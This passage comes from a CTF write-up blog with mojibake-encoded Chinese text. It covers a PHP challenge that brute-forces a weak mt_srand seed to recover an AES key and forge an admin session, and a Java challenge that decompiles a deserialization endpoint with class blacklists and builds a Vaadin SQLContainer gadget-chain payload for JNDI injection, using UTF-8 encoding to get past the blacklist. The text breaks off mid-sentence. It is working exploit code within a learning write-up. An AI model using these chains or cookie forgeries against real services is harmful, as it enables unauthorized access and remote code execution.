class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//mt_srand(rand(1e5,1e7));</span></span><br><span class="line"><span class="comment">//$key = rand();</span></span><br><span class="line"><span class="comment">//file_put_contents(*,$key);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹å‡ºæ¥åŠ å¯†ç®—æ³•ï¼ŒAES-256-CBCï¼Œkey ä¸ºéšæœºç”Ÿæˆçš„ï¼Œç§å­ä¹Ÿæ˜¯éšæœºç”Ÿæˆçš„ï¼Œå¾—çˆ†ç ´ï¼Œè´´ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100000</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();</span><br><span class="line">    <span class="variable">$session</span> = <span class="string">&quot;ja59o5qBBFlXzx7hHeauqrsXPoilxIhW%2F5Aq9CFdqF1kGFHBVjb7TvMlEfZwG5eBukjNbEQSV9VKTLuZevUwJuX2LZ7qc9lu22V%2B368YSXWwoHTWlM9XFUY9jWip3pUo&quot;</span>;</span><br><span class="line">    <span class="variable">$session</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span> <span class="keyword">and</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/guest|admin/i&quot;</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">è§£å¯†æˆåŠŸï¼è§£å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="string">&quot;</span> . (<span class="variable">$result</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key:&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;srand:&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è§£å¯†æˆåŠŸï¼è§£å¯†åçš„æ•°æ®<br> O:4:â€œUserâ€:2:{s:8:â€œusernameâ€;s:5:â€œguestâ€;s:4:â€œroleâ€;s:5:â€œguestâ€;}<br>Key:1728818262<br>srand:8168720</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">session_encrypt</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="number">1728818262</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encoded</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#DWuzth9WfI2ufPUB5nI99CQuFk4nBqn8g3cvtJfSb5E4wnC+d4sICqt3hONji9RbclgNtgPZLkKQPSvO6e6INHudhIc9ofgj4GYs/6mZWx+jLaaqV+5jQLCvvGtfLLD2</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå¾—åˆ°äº† flagã€‚</p><h3 id="ezjava"><a class="markdownIt-Anchor" href="#ezjava">#</a> ezjavaï¼š</h3><p>â€‹ä¸ä¼š javaï¼Œæ‰€ä»¥å…ˆæŠ„ä¸€éå­¦é•¿çš„ wpï¼Œä¹‹åå†å­¦ä¹ ä¸‹  (â•¥_â•¥)</p><p>â€‹é€šè¿‡é™„ä»¶ä¸­çš„ jar åŒ…å¯ä»¥çœ‹å‡ºæœ‰ï¼ŒCC3.2.1ã€vaadin ä¾èµ–ï¼Œæ¨æµ‹æ˜¯ç”¨ vaadin çš„é“¾å­ã€‚</p><p>â€‹é€šè¿‡åç¼–è¯‘ jar åŒ…çš„ IndexControllerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.normal;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/Controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String string;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">main</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span> || data.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string = data;</span><br><span class="line">        deserialize(string);      <span class="comment">//è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">normal</span>(payload).blacklist(payload)) &#123;<span class="comment">//è¿™é‡Œæœ‰é»‘åå•</span></span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> ois;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ° /file è·¯ç”±ï¼Œç›´æ¥æŠŠä¼ å…¥çš„ string å­—ç¬¦ä¸²ååºåˆ—åŒ–ï¼Œå¹¶ä¸” string æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰é»‘åå•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/normal.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">normal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">normal</span><span class="params">(String data)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">blacklist</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        String[] blacklist = &#123;<span class="string">&quot;BadAttributeValueExpException&quot;</span>, <span class="string">&quot;Collections$UnmodifiableList&quot;</span>, <span class="string">&quot;PropertysetItem&quot;</span>, <span class="string">&quot;AbstractClientConnector&quot;</span>, <span class="string">&quot;Enum&quot;</span>, <span class="string">&quot;SQLContainer&quot;</span>, <span class="string">&quot;LinkedHashMap&quot;</span>, <span class="string">&quot;TableQuery&quot;</span>, <span class="string">&quot;AbstractTransactionalQuery&quot;</span>, <span class="string">&quot;J2EEConnectionPool&quot;</span>, <span class="string">&quot;DefaultSQLGenerator&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String list : blacklist) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data.contains(list)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å¸¸ç”¨çš„ BadAttributeValueExpException</p><p>â€‹åé¢è¿™é‡Œé‡å†™äº† ObjectInputStream ç±»ï¼Œçœ‹ä¸€ä¸‹ MyObjectInputStream åšäº†å“ªäº›è¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.challenge;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectStreamClass;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/MyObjectInputStream.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// java.io.ObjectInputStream</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> desc.getName().toLowerCase();</span><br><span class="line">        String[] denyClasses = &#123;<span class="string">&quot;java.net.InetAddress&quot;</span>, <span class="string">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>, <span class="string">&quot;C3P0&quot;</span>, <span class="string">&quot;Jackson&quot;</span>, <span class="string">&quot;NestedMethodProperty&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (String str : denyClasses) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">denyClass</span> <span class="operator">=</span> str.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (className.contains(denyClass)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åˆ°è¿™é‡Œå¸¸ç”¨çš„ springã€jackson çš„é“¾å­éƒ½æ‰“ä¸é€šäº†ï¼Œåªèƒ½çœ‹å…³äº vaadin ä¾èµ–çš„é“¾å­ï¼Œç½‘ä¸Šå…¬å¼€çš„æ˜¯ NestedMethodProperty å’Œ SQLContainer è¿™ä¿©æ¡é“¾å­ï¼Œä½†æ˜¯åœ¨ resolveClass ä¸­ NestedMethodProperty ç±»åœ¨é»‘åå•ä¸­æ— æ³•ä½¿ç”¨</p><p>â€‹æ‰€ä»¥å¯ä»¥ç¡®å®šç”¨ SQLContainer é“¾å­ï¼Œblacklist é»‘åå•çš„å†…å®¹è¿™é‡Œç›´æ¥å¯ä»¥ç”¨ utf-8 ç¼–ç æ¥ç»•å³å¯ï¼ˆç½‘ä¸Šçš„ SQLContainer ä¸å¤ªå®Œæ•´ï¼Œéœ€è¦æ‰‹åŠ¨æœ¬åœ°è°ƒè¯•ä¸€ä¸‹ï¼‰ï¼Œæœ¬é¢˜æ˜¯å‡ºç½‘çš„ç›´æ¥ç”¨ JDBCConnectionPool ç±»æ‰“ JNDI æ³¨å…¥å³å¯</p><blockquote><p>JDBCConnectionPool#reserveConnection</p><p>â€‹getConnection</p><p>â€‹ TableQuery#  beginTransaction</p><p>â€‹TableQuery#containsRowWithkey</p><p>â€‹ containsId  ï¼ˆitem å¯æ§ï¼Œitem.getId å€¼ ==TableQueryï¼‰</p><p>â€‹ getValue   ----- è¿™ä¸€å±‚ï¼Œitem  == sqlcontainer</p><p>â€‹toString</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.Utils.ReflectionUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.Utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.utf.CustomObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.CacheMap;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowId;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.RowItem;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.SQLContainer;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.QueryDelegate;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.TableQuery;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.ui.ListSelect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> String string=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">J2EEConnectionPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">J2EEConnectionPool</span>(<span class="string">&quot;ldap://&quot;</span>);</span><br><span class="line">        <span class="type">TableQuery</span> <span class="variable">tableQuery</span> <span class="operator">=</span> (TableQuery) </span><br><span class="line">ReflectionUtil.createWithoutConstructor(Class.forName(<span class="string">&quot;com.vaadin.data.util.sqlconta</span></span><br><span class="line"><span class="string"> iner.query.TableQuery&quot;</span>));</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;primaryKeyColumns&quot;</span>, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;fullTableName&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;sqlGenerator&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">DefaultSQLGenerator</span>());</span><br><span class="line">        ReflectionUtil.setField(tableQuery, <span class="string">&quot;connectionPool&quot;</span>, pool);</span><br><span class="line">        <span class="type">ListSelect</span> <span class="variable">listSelect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListSelect</span>();</span><br><span class="line">        <span class="type">SQLContainer</span> <span class="variable">sql</span> <span class="operator">=</span> (SQLContainer) </span><br><span class="line">ReflectionUtil.createObject(<span class="string">&quot;com.vaadin.data.util.sqlcontainer.SQLContainer&quot;</span>, <span class="keyword">new</span> </span><br><span class="line"><span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ReflectionUtil.setField(sql, <span class="string">&quot;queryDelegate&quot;</span>, tableQuery);</span><br><span class="line">        ReflectionUtil.setField(sql,<span class="string">&quot;cachedItems&quot;</span>,<span class="keyword">new</span> <span class="title class_">CacheMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">RowId</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RowId</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;value&quot;</span>, id);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;multiSelect&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        ReflectionUtil.setField(listSelect, <span class="string">&quot;items&quot;</span>, sql);</span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">propertysetItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line">        propertysetItem.addItemProperty(<span class="string">&quot;key&quot;</span>, listSelect);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">0</span>);</span><br><span class="line">        ReflectionUtil.setField(bad, <span class="string">&quot;val&quot;</span>, propertysetItem);</span><br><span class="line">        serialize2(bad);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize2</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CustomObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectOutputStream</span>(<span class="keyword">new</span> </span><br><span class="line"><span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹CustomObjectOutputStream ç±»æ˜¯ç½‘ä¸Šå…¬å¼€çš„ utf-8 ç¼–ç 